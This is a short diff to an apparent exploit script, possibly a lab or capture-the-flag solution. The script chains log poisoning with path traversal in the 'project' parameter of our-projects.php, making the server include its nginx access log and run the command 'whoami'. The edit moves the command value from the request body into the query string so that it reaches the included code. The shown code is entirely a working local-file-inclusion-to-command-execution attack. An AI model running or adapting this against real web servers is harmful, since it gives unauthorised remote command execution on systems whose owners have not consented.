@@ -12,6 +12,6 @@ headers = {
 }
 
 get(f'http://{IP}:{PORT}/', headers=headers)
-r = get(f'http://{IP}:{PORT}/our-projects.php?project=../../../../var/log/nginx/access.log', data={'cmd': 'whoami'})
+r = get(f'http://{IP}:{PORT}/our-projects.php?project=../../../../var/log/nginx/access.log', params={'cmd': 'whoami'})
 
 print(r.text)
